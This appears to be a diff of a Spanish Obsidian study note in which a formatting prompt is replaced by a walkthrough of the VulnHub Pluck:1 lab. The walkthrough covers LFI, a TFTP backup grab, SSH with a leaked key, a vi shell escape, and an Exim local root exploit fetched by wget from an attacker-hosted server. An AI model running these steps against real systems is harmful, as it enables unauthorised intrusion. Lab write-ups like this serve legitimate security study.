@@ -1,99 +1,232 @@
 ---
 Tema: "[[Escalada de Privilegios]]"
 ---
-
-Quiero que actúes como un asistente especializado en mejorar y embellecer mis apuntes de **hacking y ciberseguridad** en Obsidian.
-
-### Reglas de formato:
-- Usa **Markdown** y todas las herramientas nativas de Obsidian:  
-  - Encabezados jerárquicos (#, ##, ###…)  
-  - Negritas, cursivas, tachado  
-  - Listas ordenadas y no ordenadas  
-  - Tablas para comparaciones  
-  - Callouts (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, etc.)  
-  - Diagramas con **Mermaid** (especialmente diagramas de redes, flujos y ataques)  
-  - Bloques de código y comandos de terminal (bash, python, etc.)  
-  - Separadores `---` para estructurar  
-
-### Reglas de estilo:
-- Embellecé y organizá mis notas para que sean **claras, fáciles de leer y visualmente atractivas**.  
-- Si algo está enredado o difícil de entender, simplificalo y hacelo **más didáctico**.  
-- Agregá **ejemplos prácticos** (comandos reales, simulaciones, casos de uso).  
-- Respetá los **enlaces e imágenes** que yo incluya. No borres ni inventes enlaces/imágenes nuevas.  
-- Podés usar **diagramas de red (Mermaid), tablas comparativas y listas de pasos** para explicar ataques, defensas y herramientas.  
-- El resultado final debe ser un apunte **técnico, claro y útil para estudiar hacking**.  
-
-Cuando te pase un texto, transformalo siguiendo estas reglas.
-
-Aqui te va el texto:
+# 🚀 Máquina Pluck:1 - VulnHub Walkthrough
 
 ---
 
-algo de teoria
+## 📝 Teoría
 
+### ¿Qué vamos a explotar?
+
+En esta máquina encontramos una combinación de vulnerabilidades típicas:
+
+1. **Local File Inclusion (LFI)** con [[Tecnica Wrapper]]
+2. **Backup inseguro** accesible via [[tftp]]
+3. **SSH con claves privadas expuestas**
+4. **Escalada de privilegios** mediante exploit de [[exim]]
 
 ---
-practica
-maquina pluck: 1 de vulnhub
 
-para empezar
-la url tiene un estilo como 
-http://localhost/index.php?page=admin.php
+## 🛠️ Práctica: Walkthrough Completo
 
-esto permite jugar con [[Tecnica Wrapper]] 
+### 1. Reconocimiento inicial
 
-pero lo importante es que se pueden listar archivos especificos como el etc passwd
+> [!info] URL vulnerable detectada
+> `http://localhost/index.php?page=admin.php`
+> 
+> Esto nos permite jugar con [[Tecnica Wrapper]]
+
+#### Explotando LFI para leer archivos
+
+```bash
+# Leer /etc/passwd
 http://localhost/index.php?page=/etc/passwd
+```
 
-encontraremos un archivo backup.sh
+#### Descubrimiento del archivo backup.sh
 
 ![[Pasted image 20250927172129.png]]
 
-si miramos que tiene este archivo nos sale
+**Contenido del archivo:**
 
 ![[Pasted image 20250927172221.png]]
 
-esto dice que hace backups en el dir backups y podemos obtenerlo via [[tftp]]
+> [!tip] Información clave
+> El script revela que hace **backups** en el directorio `backups` y que podemos obtenerlos via [[tftp]].
 
-extraemos con 
-descomprimimos el backup con 
+---
+
+### 2. Extracción de archivos via TFTP
+
+#### Descargar el backup
+
+```bash
+# Conectar al servidor TFTP y descargar backup
+tftp <target_ip>
+tftp> get backups/backup.tar.gz
+tftp> quit
+```
+
+#### Descomprimir y analizar
+
+```bash
 tar -xf backups/backup.tar.gz
+```
 
-y al descomprimirlo se pueden ver archivos varios
+> [!example] Contenido del backup
+> Al descomprimirlo encontramos **directorios con claves SSH públicas y privadas**.
 
-hay un directorio que contiene claves privadas y publicas
+---
 
-en nuestro caso la usamos la key  id_key4
+### 3. Acceso SSH con clave privada
 
+#### Usar la clave encontrada
+
+```bash
 ssh paul@192.168.111.46 -i id_key4
+```
 
-nos da acceso a la maquina como paul
+> [!warning] Restricción detectada
+> El usuario `paul` tiene `/home/paul:/usr/bin/pdmenu` como shell, lo que restringe las acciones disponibles.
 
-pero como vimos en el etcpasswd paul esta ejecutando de entrada /home/paul:/usr/bin/pdmenu 
+---
 
+### 4. Bypass de pdmenu y obtención de shell
 
-y pdmenu es un binario que tiene una opcion de edit file al menos en esta maquina de prueba
-AHI LE PODEMOS PONER EL etc/passwd
+#### Escapar de pdmenu usando vi
 
-pero nos abre vi
+En el menú **pdmenu** hay una opción `edit file`. Al seleccionarla:
 
-en [[GTFOBins]] nos da una forma para lanzar una shell abusando de vi
+1. Abrimos `/etc/passwd` 
+2. Esto nos da acceso a **vi**
+3. Consultamos [[GTFOBins]] para escapar de vi
 
-podemos hacer
+#### Ejecutar escape via GTFOBins
+
+```bash
+# Dentro de vi, ejecutar:
 :set shell=/bin/bash
 :shell
+```
 
-y ya, ahora para tener mejor comodida 
-export TERM=xterm" para ctrl l y demas
+#### Mejorar la terminal
 
+```bash
+export TERM=xterm
+```
 
-ahora la escalada de privilegios
+---
 
-al hacer id no estamos en ningun grupo especial viendo lo de [[Post Explotacion - Linux]] para aplicar reoconicimiento y saber donde estamos parados
+### 5. Escalada de privilegios
 
-ver la distro
+#### Reconocimiento post-explotación
+
+Aplicamos técnicas de [[Post Explotacion - Linux]]:
+
+```bash
+# Ver información del usuario
+id
+
+# Información del sistema
 cat /etc/os-release
-
-a nivel de kernel
 uname -a
 
+# Buscar binarios SUID
+find / -perm -4000 2>/dev/null
+```
+
+#### Descubrimiento de Exim vulnerable
+
+```bash
+# Encontramos: /usr/exim/bin/exim-4.84-7
+ls -la /usr/exim/bin/exim-4.84-7
+```
+
+Este es el servicio [[exim]] versión **4.84-7**.
+
+---
+
+### 6. Explotación de Exim
+
+#### Buscar exploits disponibles
+
+```bash
+searchsploit exim 4.84
+```
+
+**Resultado:**
+```
+------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                |  Path
+------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Exim - 'perl_startup' Local Privilege Escalation (Metasploit)                                                                 | linux/local/39702.rb
+Exim 4.84-3 - Local Privilege Escalation                                                                                      | linux/local/39535.sh
+Exim < 4.86.2 - Local Privilege Escalation                                                                                    | linux/local/39549.txt
+Exim < 4.90.1 - 'base64d' Remote Code Execution                                                                               | linux/remote/44571.py
+PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                                      | php/webapps/42221.py
+------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+```
+
+#### Usar el exploit 39535.sh
+
+**En la máquina atacante:**
+```bash
+# Descargar el exploit
+searchsploit -m linux/local/39535.sh
+
+# Crear servidor HTTP
+python3 -m http.server 80
+```
+
+**En la máquina vulnerable:**
+```bash
+# Descargar el exploit
+wget http://ip_del_atacante/39535.sh
+
+# Dar permisos de ejecución
+chmod +x 39535.sh
+
+# Ejecutar exploit
+./39535.sh
+```
+
+> [!success] ¡Root obtenido!
+> El exploit aprovecha una vulnerabilidad en Exim 4.84-7 para obtener privilegios de root.
+
+---
+
+## 🗺️ Diagrama de flujo del ataque
+
+```mermaid
+flowchart TD
+    A[Reconocimiento web] --> B[LFI detectado]
+    B --> C[Leer backup.sh]
+    C --> D[Descargar backup via TFTP]
+    D --> E[Extraer claves SSH]
+    E --> F[Acceso SSH como paul]
+    F --> G[Bypass de pdmenu con vi]
+    G --> H[Shell como paul]
+    H --> I[Enumeración post-explotación]
+    I --> J[Exim 4.84-7 vulnerable]
+    J --> K[Exploit de escalada]
+    K --> L[ROOT OBTENIDO]
+```
+
+---
+
+## 📋 Resumen de técnicas utilizadas
+
+| Fase | Técnica | Herramienta/Método |
+|------|---------|-------------------|
+| **Reconocimiento** | LFI + File Reading | [[Tecnica Wrapper]] |
+| **Exfiltración** | Descarga de archivos | [[tftp]] |
+| **Acceso inicial** | Autenticación con clave | SSH + clave privada |
+| **Bypass** | Escape de shell restringida | [[GTFOBins]] + vi |
+| **Escalada** | Local Privilege Escalation | Exploit [[exim]] 4.84-7 |
+
+---
+
+## 🛡️ Lecciones aprendidas
+
+> [!tip] Vectores de ataque identificados
+> 1. **LFI sin sanitización** permite leer archivos del sistema
+> 2. **TFTP expuesto** facilita la exfiltración de backups
+> 3. **Claves SSH en backups** comprometen la autenticación
+> 4. **Shells restringidas** pueden ser bypasseadas con GTFOBins
+> 5. **Servicios desactualizados** como Exim son vectores de escalada
+
+---
+
+> [!success] ¡Máquina comprometida exitosamente!
+> Esta máquina es excelente para practicar múltiples vectores de ataque y técnicas de post-explotación.
